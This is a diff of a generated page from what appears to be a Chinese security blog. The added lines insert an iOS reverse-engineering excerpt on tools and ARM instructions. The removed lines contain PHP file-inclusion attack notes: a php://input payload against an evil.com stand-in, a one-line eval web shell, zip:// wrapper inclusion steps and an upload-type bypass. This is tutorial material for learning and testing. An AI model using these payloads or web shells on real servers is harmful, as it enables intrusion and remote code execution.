@@ -117,6 +117,230 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/02/02/mac-re.html" >IOS逆向入门</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-02-02  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>最后找到了加密的秘钥，找到之后发现整个流程好简单。之前找不到首先不熟悉Object-C的语法，其次就是arm指令，记录如下：</p>
+<h2 id="0x01-工具"><a href="#0x01-工具" class="headerlink" title="0x01 工具"></a>0x01 工具</h2><p>首先是要用到的工具，中间主要用了ida，hopper和lldb</p>
+<ul>
+<li>dumpdecrypted: 将苹果加密过的app砸壳</li>
+<li>class-dump: 导出MachO文件里ObjC类及方法定义</li>
+<li>CydiaSubstrate: 将第三方动态库注入进程</li>
+<li>Cycript: 用js语法写ObjC方法</li>
+<li>Theos: 越狱插件开发工具</li>
+<li>IDA: 反汇编、反编译工具</li>
+<li>Hopper: OSX反汇编、反编译工具</li>
+<li>Debugserver + LLDB: 动态调试器</li>
+</ul>
+<h2 id="0x02-ARM指令"><a href="#0x02-ARM指令" class="headerlink" title="0x02 ARM指令"></a>0x02 ARM指令</h2><pre class="line-numbers language-none"><code class="language-none">arm是RISC结构，数据从内存到CPU之间移动只能通过L&#x2F;S指令来完成，就是ldr&#x2F;str指令
+ldr 把数据从内存移到cpu
+str 把cpu的数据数据转移到内存
+lldb读取内存的数据，memory read &lt;start&gt; &lt;end&gt;
+ldr r0, 0x12345678   &#x2F;&#x2F;把0x12345678这个地址中的值存放到r0中
+ldr r0, &#x3D;0x12345678  &#x2F;&#x2F;把0x12345678这个地址写到r0中
+例子：
+COUNT EQU 0x40003100 &#x2F;&#x2F;定义一个COUNT变量，地址是0x40003100
+...
+LDR R1,&#x3D;COUNT       &#x2F;&#x2F;将COUNT这个变量的地址，也就是0x40003100放到R1中
+MOV R0,#0           &#x2F;&#x2F;将立即数0放到R0中
+STR R0,[R1]         &#x2F;&#x2F;将R0中的值放到以R1中的值为地址的存储单元去
+
+
+
+
+B 跳转指令
+BL 带返回的跳转指令
+BLX 带返回和状态切换的跳转指令
+BX  带状态切换的跳转指令
+
+BLX指令从ARM指令集跳转到指令中所指定的目标地址，并将处理器的工作状态从ARM切换到Thumb状态，该指令同时将PC的当前内容保存到寄存器R14，因此，当子程序使用Thumb指令集，而调用者者使用ARM指令集，可以通过BLX指令实现子程序的调用和处理器工作状态切换，同时，子程序的返回可以通过将寄存器R14的值复制到PC中来完成。
+　R0-R3:　　　　　　　　用于函数参数及返回值的传递，超过4个参数，其它参数存在栈中，在ARM中栈是向下生长的，R0还可以作为返回值。
+　　R4-R6, R8, R10-R11:　没有特殊规定，就是普通的通用寄存器
+　　R7:　　　　　　　　　　栈帧指针，指向母函数与被调用子函数在栈中的交界。
+　　R9:　　　　　　　　　　在iOS3.0被操作系统保留
+　　R12:　　　　　　　　　 内部过程调用寄存器，动态链接时会用到，不必深究
+　　R13:　　　　　　　　　 SP(stack pointer)，是栈顶指针
+　　R14:　　　　　　　　　 LR(link register)，存放函数的返回地址。
+　　R15:　　　　　　　　　 PC(program counter)，指向当前指令地址。
+ADC 　　 带进位的加法
+　　ADD 　　 加法
+　　AND 　　 逻辑与
+　　B 　　　  分支跳转，很少单独使用
+　　BL          分支跳转，跳转后返回地址存入r14
+　　BX          分支跳转，并切换指令模式（Thumb&#x2F;ARM）
+　　CMP        比较值，结果存在程序状态寄存器，一般用于分支判断
+　　BEQ        结果为0则跳转
+　　BNE        结果不为0跳转
+　　LDR        加载寄存器，从内存加载到寄存器
+　　LDRB      装载字节到寄存器
+　　LDRH      装载半字到寄存器（一个字是32位）
+　　LSL         逻辑左移 这是一个选项，不是指令
+　　LSR         逻辑右移 这是一个选项，不是指令
+　　MOV        传送值&#x2F;寄存器到一个寄存器 
+　　STR         存储一个寄存器，寄存器值存到内存
+　　STRB       存储一个字节
+　　STRH       存储一个半字
+　　SUB         减法
+　　PUSH POP 堆栈操作
+
+有时候需要
+
+db  ；定义字节类型变量，一个字节数据占一个字节单元，读完一个偏移量加1
+dw  ；定义字类型变量，一个字数据占2个字节单元，读完一个，偏移量加2
+dd  ；定义双字类型变量，一个双字数据占4个字节单元，读完一个，偏移量加4
+
+IDA给某个位置命名的时，它会使用该位置的虚拟地址和表示一个该地址的类型的前缀进行命名：
+sub_xxx  ；地址xxx处的子例程
+loc_xxx  ；地址xxx处的一个指令
+byte_xxx ；位置xxx处的8位数据
+word_xxx ;位置xxx处的16位数据
+dword_xxx ;位置xxx处的32位数据
+unk_xxx   ;位置xxx处大小未知的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>关于sp，bp等栈寄存器的解释：</p>
+<pre class="line-numbers language-none"><code class="language-none">
+SP is stack pointer. The stack is generally used to hold &quot;automatic&quot; variables and context&#x2F;parameters across function calls. Conceptually you can think of the &quot;stack&quot; as a place where you &quot;pile&quot; your data. You keep &quot;stacking&quot; one piece of data over the other and the stack pointer tells you how &quot;high&quot; your &quot;stack&quot; of data is. You can remove data from the &quot;top&quot; of the &quot;stack&quot; and make it shorter.
+
+
+&lt;https:&#x2F;&#x2F;www.zybuluo.com&#x2F;oro-oro&#x2F;note&#x2F;137244&gt;
+&lt;http:&#x2F;&#x2F;cryptroix.com&#x2F;2016&#x2F;10&#x2F;16&#x2F;journey-to-the-stack&#x2F;&gt;
+&lt;http:&#x2F;&#x2F;en.citizendium.org&#x2F;wiki&#x2F;Stack_frame&gt;
+虽然是英文，但是看起来要比中文易懂<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>ida里面有三种颜色的箭头:</p>
+<ol>
+<li>蓝色，顺序执行</li>
+<li>绿色，条件为(YES)</li>
+<li>红色，条件为（NO）</li>
+</ol>
+	
+
+	</div>
+  <a type="button" href="/2017/02/02/mac-re.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>最后找到了加密的秘钥，找到之后发现整个流程好简单。之前找不到首先不熟悉Object-C的语法，其次就是arm指令，记录如下：</p>
+<h2 id="0x01-工具"><a href="#0x01-工具" class="headerlink" title="0x01 工具"></a>0x01 工具</h2><p>首先是要用到的工具，中间主要用了ida，hopper和lldb</p>
+<ul>
+<li>dumpdecrypted: 将苹果加密过的app砸壳</li>
+<li>class-dump: 导出MachO文件里ObjC类及方法定义</li>
+<li>CydiaSubstrate: 将第三方动态库注入进程</li>
+<li>Cycript: 用js语法写ObjC方法</li>
+<li>Theos: 越狱插件开发工具</li>
+<li>IDA: 反汇编、反编译工具</li>
+<li>Hopper: OSX反汇编、反编译工具</li>
+<li>Debugserver + LLDB: 动态调试器</li>
+</ul>
+<h2 id="0x02-ARM指令"><a href="#0x02-ARM指令" class="headerlink" title="0x02 ARM指令"></a>0x02 ARM指令</h2><pre class="line-numbers language-none"><code class="language-none">arm是RISC结构，数据从内存到CPU之间移动只能通过L&#x2F;S指令来完成，就是ldr&#x2F;str指令
+ldr 把数据从内存移到cpu
+str 把cpu的数据数据转移到内存
+lldb读取内存的数据，memory read &lt;start&gt; &lt;end&gt;
+ldr r0, 0x12345678   &#x2F;&#x2F;把0x12345678这个地址中的值存放到r0中
+ldr r0, &#x3D;0x12345678  &#x2F;&#x2F;把0x12345678这个地址写到r0中
+例子：
+COUNT EQU 0x40003100 &#x2F;&#x2F;定义一个COUNT变量，地址是0x40003100
+...
+LDR R1,&#x3D;COUNT       &#x2F;&#x2F;将COUNT这个变量的地址，也就是0x40003100放到R1中
+MOV R0,#0           &#x2F;&#x2F;将立即数0放到R0中
+STR R0,[R1]         &#x2F;&#x2F;将R0中的值放到以R1中的值为地址的存储单元去
+
+
+
+
+B 跳转指令
+BL 带返回的跳转指令
+BLX 带返回和状态切换的跳转指令
+BX  带状态切换的跳转指令
+
+BLX指令从ARM指令集跳转到指令中所指定的目标地址，并将处理器的工作状态从ARM切换到Thumb状态，该指令同时将PC的当前内容保存到寄存器R14，因此，当子程序使用Thumb指令集，而调用者者使用ARM指令集，可以通过BLX指令实现子程序的调用和处理器工作状态切换，同时，子程序的返回可以通过将寄存器R14的值复制到PC中来完成。
+　R0-R3:　　　　　　　　用于函数参数及返回值的传递，超过4个参数，其它参数存在栈中，在ARM中栈是向下生长的，R0还可以作为返回值。
+　　R4-R6, R8, R10-R11:　没有特殊规定，就是普通的通用寄存器
+　　R7:　　　　　　　　　　栈帧指针，指向母函数与被调用子函数在栈中的交界。
+　　R9:　　　　　　　　　　在iOS3.0被操作系统保留
+　　R12:　　　　　　　　　 内部过程调用寄存器，动态链接时会用到，不必深究
+　　R13:　　　　　　　　　 SP(stack pointer)，是栈顶指针
+　　R14:　　　　　　　　　 LR(link register)，存放函数的返回地址。
+　　R15:　　　　　　　　　 PC(program counter)，指向当前指令地址。
+ADC 　　 带进位的加法
+　　ADD 　　 加法
+　　AND 　　 逻辑与
+　　B 　　　  分支跳转，很少单独使用
+　　BL          分支跳转，跳转后返回地址存入r14
+　　BX          分支跳转，并切换指令模式（Thumb&#x2F;ARM）
+　　CMP        比较值，结果存在程序状态寄存器，一般用于分支判断
+　　BEQ        结果为0则跳转
+　　BNE        结果不为0跳转
+　　LDR        加载寄存器，从内存加载到寄存器
+　　LDRB      装载字节到寄存器
+　　LDRH      装载半字到寄存器（一个字是32位）
+　　LSL         逻辑左移 这是一个选项，不是指令
+　　LSR         逻辑右移 这是一个选项，不是指令
+　　MOV        传送值&#x2F;寄存器到一个寄存器 
+　　STR         存储一个寄存器，寄存器值存到内存
+　　STRB       存储一个字节
+　　STRH       存储一个半字
+　　SUB         减法
+　　PUSH POP 堆栈操作
+
+有时候需要
+
+db  ；定义字节类型变量，一个字节数据占一个字节单元，读完一个偏移量加1
+dw  ；定义字类型变量，一个字数据占2个字节单元，读完一个，偏移量加2
+dd  ；定义双字类型变量，一个双字数据占4个字节单元，读完一个，偏移量加4
+
+IDA给某个位置命名的时，它会使用该位置的虚拟地址和表示一个该地址的类型的前缀进行命名：
+sub_xxx  ；地址xxx处的子例程
+loc_xxx  ；地址xxx处的一个指令
+byte_xxx ；位置xxx处的8位数据
+word_xxx ;位置xxx处的16位数据
+dword_xxx ;位置xxx处的32位数据
+unk_xxx   ;位置xxx处大小未知的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>关于sp，bp等栈寄存器的解释：</p>
+<pre class="line-numbers language-none"><code class="language-none">
+SP is stack pointer. The stack is generally used to hold &quot;automatic&quot; variables and context&#x2F;parameters across function calls. Conceptually you can think of the &quot;stack&quot; as a place where you &quot;pile&quot; your data. You keep &quot;stacking&quot; one piece of data over the other and the stack pointer tells you how &quot;high&quot; your &quot;stack&quot; of data is. You can remove data from the &quot;top&quot; of the &quot;stack&quot; and make it shorter.
+
+
+&lt;https:&#x2F;&#x2F;www.zybuluo.com&#x2F;oro-oro&#x2F;note&#x2F;137244&gt;
+&lt;http:&#x2F;&#x2F;cryptroix.com&#x2F;2016&#x2F;10&#x2F;16&#x2F;journey-to-the-stack&#x2F;&gt;
+&lt;http:&#x2F;&#x2F;en.citizendium.org&#x2F;wiki&#x2F;Stack_frame&gt;
+虽然是英文，但是看起来要比中文易懂<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>ida里面有三种颜色的箭头:</p>
+<ol>
+<li>蓝色，顺序执行</li>
+<li>绿色，条件为(YES)</li>
+<li>红色，条件为（NO）</li>
+</ol>
+	
+	</div>
+  <a type="button" href="/2017/02/02/mac-re.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/01/07/n0js-case-postMessage-xss.html" >n0js case3</a>
 		</h3>
 		</div>
@@ -491,146 +715,6 @@ eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2016/12/28/php的zip伪协议.html" >php://input&amp;&amp;php://filter</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2016-12-28  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>php://input需要服务器的支持，同时要求”allow_url_include”设置为On，在PHP的配置文件php.ini配置。对于一个LFI产生的漏洞比如：</p>
-<pre class="line-numbers language-none"><code class="language-none">index.php:
-
-&lt;?php
-    $b&#x3D;$_REQUEST[&quot;b&quot;];
-    @include($b);
- ?&gt;
- 
-EXP:
-
-GET http:&#x2F;&#x2F;evil.com&#x2F;index.php?php:&#x2F;&#x2F;input
-&lt;?php system(&quot;id&quot;)?&gt;
-
-获取文件内容：
-&lt;?php echo file_get_contents(&quot;info.php&quot;);?&gt; &#x2F;&#x2F;测试可用
-&lt;?php echo base64_encode(file_get_contents(&quot;info.php&quot;));?&gt;  &#x2F;&#x2F;http:&#x2F;&#x2F;www.cnblogs.com&#x2F;LittleHann&#x2F;p&#x2F;3665062.html 防止获取&#96;.php&#96;文件的时候php执行，先base64编码下，但是实际测试上述即可用。php在4点多的版本使用这个可以读出来
-
-
-fimap.py 类似sqlmap.py，用来文件包含扫描，可以获取一个交互shell
-另外一个php伪协议：
- 
-file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;image.php
-用来读取php文件。
- <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><code>$_FILES[“file”][“type”]</code><br>这个参数是浏览器生成传递给服务端的，虽然不是用户输入数据，但是是属于客户端传递过来的数据，也就是用户其实是可以控制这个参数的。只需要修改Content-Type: image/jpeg 就可以绕过这个检查，上传任意类型的文件。</p>
-<h3 id="php的zip伪协议"><a href="#php的zip伪协议" class="headerlink" title="php的zip伪协议"></a>php的zip伪协议</h3><p>假设有以下的代码：</p>
-<pre class="line-numbers language-none"><code class="language-none">file.php:
-
-&lt;?php
-@include($_GET[&#39;a&#39;].&quot;.jpg&quot;);
-@include($_GET[&#39;b&#39;].&quot;.php&quot;);
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>明细的包含，对于参数a和参数b可以这样来解决，比如有一个</p>
-<pre class="line-numbers language-none"><code class="language-none">shell.php:
-
-&lt;?php eval($_GET[&#39;c&#39;]);?&gt;
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>a参数最终包含的是一个jpg，b参数是一个php</p>
-<pre class="line-numbers language-none"><code class="language-none">对于a来说：
-mv shell.php shell.jpg
-zip a.zip shell.jpg
-
-访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?a&#x3D;zip:&#x2F;&#x2F;a.zip%23shell&amp;c&#x3D;phpinfo();
-
-对于b来说：
-zip b.zip shell.php
-
-访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?b&#x3D;zip:&#x2F;&#x2F;b.zip%23shell&amp;c&#x3D;phpinfo();
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2016/12/28/php的zip伪协议.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>php://input需要服务器的支持，同时要求”allow_url_include”设置为On，在PHP的配置文件php.ini配置。对于一个LFI产生的漏洞比如：</p>
-<pre class="line-numbers language-none"><code class="language-none">index.php:
-
-&lt;?php
-    $b&#x3D;$_REQUEST[&quot;b&quot;];
-    @include($b);
- ?&gt;
- 
-EXP:
-
-GET http:&#x2F;&#x2F;evil.com&#x2F;index.php?php:&#x2F;&#x2F;input
-&lt;?php system(&quot;id&quot;)?&gt;
-
-获取文件内容：
-&lt;?php echo file_get_contents(&quot;info.php&quot;);?&gt; &#x2F;&#x2F;测试可用
-&lt;?php echo base64_encode(file_get_contents(&quot;info.php&quot;));?&gt;  &#x2F;&#x2F;http:&#x2F;&#x2F;www.cnblogs.com&#x2F;LittleHann&#x2F;p&#x2F;3665062.html 防止获取&#96;.php&#96;文件的时候php执行，先base64编码下，但是实际测试上述即可用。php在4点多的版本使用这个可以读出来
-
-
-fimap.py 类似sqlmap.py，用来文件包含扫描，可以获取一个交互shell
-另外一个php伪协议：
- 
-file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;image.php
-用来读取php文件。
- <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><code>$_FILES[“file”][“type”]</code><br>这个参数是浏览器生成传递给服务端的，虽然不是用户输入数据，但是是属于客户端传递过来的数据，也就是用户其实是可以控制这个参数的。只需要修改Content-Type: image/jpeg 就可以绕过这个检查，上传任意类型的文件。</p>
-<h3 id="php的zip伪协议"><a href="#php的zip伪协议" class="headerlink" title="php的zip伪协议"></a>php的zip伪协议</h3><p>假设有以下的代码：</p>
-<pre class="line-numbers language-none"><code class="language-none">file.php:
-
-&lt;?php
-@include($_GET[&#39;a&#39;].&quot;.jpg&quot;);
-@include($_GET[&#39;b&#39;].&quot;.php&quot;);
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>明细的包含，对于参数a和参数b可以这样来解决，比如有一个</p>
-<pre class="line-numbers language-none"><code class="language-none">shell.php:
-
-&lt;?php eval($_GET[&#39;c&#39;]);?&gt;
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>a参数最终包含的是一个jpg，b参数是一个php</p>
-<pre class="line-numbers language-none"><code class="language-none">对于a来说：
-mv shell.php shell.jpg
-zip a.zip shell.jpg
-
-访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?a&#x3D;zip:&#x2F;&#x2F;a.zip%23shell&amp;c&#x3D;phpinfo();
-
-对于b来说：
-zip b.zip shell.php
-
-访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?b&#x3D;zip:&#x2F;&#x2F;b.zip%23shell&amp;c&#x3D;phpinfo();
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2016/12/28/php的zip伪协议.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -688,7 +772,7 @@ zip b.zip shell.php
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>52</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>53</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -709,6 +793,10 @@ zip b.zip shell.php
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/05/26/cobaltstrike-learn.html" ><i class="fa fa-file-o"></i>CobaltStrike通信学习笔记</a>
+      </li>
+    
+      <li>
         <a href="/2023/05/10/pay_vuln.html" ><i class="fa fa-file-o"></i>支付接口安全测试记录</a>
       </li>
     
@@ -722,10 +810,6 @@ zip b.zip shell.php
     
       <li>
         <a href="/2023/03/27/pinfish-and-osx-pentest.html" ><i class="fa fa-file-o"></i>记一次钓鱼演练和OS X下的渗透技巧</a>
-      </li>
-    
-      <li>
-        <a href="/2023/03/03/github-trick.html" ><i class="fa fa-file-o"></i>Github搜索小技巧</a>
       </li>
     
   </ul>
